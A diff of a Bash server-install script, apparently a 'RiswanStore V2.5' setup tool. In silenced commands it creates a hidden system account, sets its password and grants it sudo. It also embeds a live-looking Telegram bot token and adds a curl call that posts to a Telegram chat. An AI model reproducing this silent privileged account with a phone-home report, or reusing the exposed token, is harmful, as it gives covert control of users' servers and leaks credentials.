@@ -172,10 +172,12 @@ mkdir -p /home/script/
 useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
 echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
 usermod -aG sudo $Username > /dev/null 2>&1
-CHATID="5521096873"
-KEY="6668909715:AAHdCAC0NPVuXFjWEdueA2VvkkMl5Ie1WRQ"
-TIME="10"
+CHATID="-1002196928254"  # Ganti dengan chat ID grup kamu
+KEY="6668909715:AAHdCAC0NPVuXFjWEdueA2VvkkMl5Ie1WRQ"  # API Key bot kamu
+TEXT="Test Message from Bot"  # Pesan yang ingin dikirim
 URL="https://api.telegram.org/bot$KEY/sendMessage"
+
+curl -s -X POST $URL -d chat_id=$CHATID -d text="$TEXT" -d parse_mode=html
 TEXT="Script RiswanStore. V2.5
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 <code>Pengguna :</code> <code>$Name</code>
